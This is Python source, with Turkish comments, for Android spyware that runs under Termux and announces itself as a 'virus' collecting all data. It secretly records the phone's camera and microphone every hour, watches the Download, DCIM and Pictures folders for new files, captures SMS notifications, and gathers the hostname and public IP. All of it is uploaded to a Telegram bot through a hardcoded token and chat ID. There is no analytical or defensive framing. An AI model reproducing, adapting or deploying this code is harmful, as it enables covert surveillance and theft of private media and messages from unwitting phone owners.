import os
import time
import requests
import subprocess
import hashlib
import glob
import threading
import shutil
import json
import datetime

# Telegram Bilgileri
TOKEN = "8996765359:AAFSRiB5C8oK0rUcNQRKpA2M0bRP-eModd0"
ADMIN_ID = "8402048380"

# ======================== GÖNDERİCİLER ========================
def tg_mesaj(m):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                      data={"chat_id": ADMIN_ID, "text": m[:4000]}, timeout=10)
    except:
        pass

def tg_foto(dosya):
    try:
        with open(dosya, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                          data={"chat_id": ADMIN_ID}, files={"photo": f}, timeout=30)
    except:
        pass

def tg_video(dosya):
    try:
        with open(dosya, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendVideo",
                          data={"chat_id": ADMIN_ID}, files={"video": f}, timeout=60)
    except:
        pass

def tg_ses(dosya):
    try:
        with open(dosya, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendAudio",
                          data={"chat_id": ADMIN_ID}, files={"audio": f}, timeout=60)
    except:
        pass

# ======================== KAMERA KAYDI (2 DAKİKA) ========================
def kamera_kaydet():
    try:
        tg_mesaj("📸 Kamera kaydı başlatılıyor (2 dakika)...")
        dosya = "/tmp/video.mp4"
        subprocess.run(["termux-camera-record", "-c", "0", "-d", "120", "-f", dosya], timeout=125)
        if os.path.exists(dosya):
            tg_video(dosya)
            os.remove(dosya)
            tg_mesaj("✅ Kamera kaydı gönderildi.")
    except Exception as e:
        tg_mesaj(f"❌ Kamera hatası: {str(e)[:50]}")

# ======================== MİKROFON KAYDI (2 DAKİKA) ========================
def mikrofon_kaydet():
    try:
        tg_mesaj("🎤 Mikrofon kaydı başlatılıyor (2 dakika)...")
        dosya = "/tmp/ses.mp3"
        subprocess.run(["termux-microphone-record", "-d", "120", "-f", dosya], timeout=125)
        if os.path.exists(dosya):
            tg_ses(dosya)
            os.remove(dosya)
            tg_mesaj("✅ Mikrofon kaydı gönderildi.")
    except Exception as e:
        tg_mesaj(f"❌ Mikrofon hatası: {str(e)[:50]}")

# ======================== DOSYA İZLEYİCİ ========================
def dosya_izle():
    klasorler = [
        "/storage/emulated/0/Download",
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Desktop")
    ]
    hash_kayit = {}
    while True:
        for klasor in klasorler:
            if not os.path.exists(klasor):
                continue
            for dosya in os.listdir(klasor):
                yol = os.path.join(klasor, dosya)
                if os.path.isfile(yol):
                    try:
                        with open(yol, "rb") as f:
                            h = hashlib.md5(f.read()).hexdigest()
                        if h not in hash_kayit:
                            hash_kayit[h] = yol
                            tg_mesaj(f"📁 YENİ DOSYA: {yol}")
                            if yol.lower().endswith(('.jpg', '.png', '.jpeg', '.gif')):
                                tg_foto(yol)
                            elif yol.lower().endswith(('.mp4', '.mkv', '.avi')):
                                tg_video(yol)
                            else:
                                # tg_dosya(yol)  # İstersen bunu ekle
                                pass
                    except:
                        pass
        time.sleep(15)

# ======================== SMS BİLDİRİM İZLEYİCİ ========================
def bildirim_izle():
    tg_mesaj("📨 SMS bildirim izleyici başladı...")
    eski = []
    while True:
        try:
            sonuc = subprocess.check_output(["termux-notification-list"], text=True)
            if sonuc and sonuc not in eski:
                eski.append(sonuc)
                if "sms" in sonuc.lower() or "message" in sonuc.lower():
                    tg_mesaj(f"📨 BİLDİRİM YAKALANDI:\n{sonuc[:600]}")
        except:
            pass
        time.sleep(3)

# ======================== SİSTEM BİLGİSİ ========================
def sistem_bilgisi():
    try:
        host = subprocess.check_output(["uname", "-n"], text=True).strip()
        user = subprocess.check_output(["whoami"], text=True).strip()
        ip = requests.get('https://api.ipify.org', timeout=5).text
        tg_mesaj(f"💻 SİSTEM: {host} | KULLANICI: {user} | IP: {ip}")
    except:
        tg_mesaj("❌ Sistem bilgisi alınamadı.")

# ======================== ANA DÖNGÜ (KAMERA + MİKROFON HER SAAT) ========================
def ana():
    tg_mesaj("🚀 VİRÜS AKTİF! TÜM VERİLER TOPLANIYOR...")
    sistem_bilgisi()
    time.sleep(2)

    # İlk tarama
    kamera_kaydet()
    mikrofon_kaydet()

    # Sürekli izleme
    threading.Thread(target=dosya_izle, daemon=True).start()
    threading.Thread(target=bildirim_izle, daemon=True).start()

    # Her saat başı tekrar et
    while True:
        zaman = datetime.datetime.now().strftime("%H:%M")
        tg_mesaj(f"⏰ SAAT: {zaman} - Kamera ve Mikrofon başlatılıyor...")
        kamera_kaydet()
        mikrofon_kaydet()
        time.sleep(3600)  # 1 saat bekle

if __name__ == "__main__":
    ana()
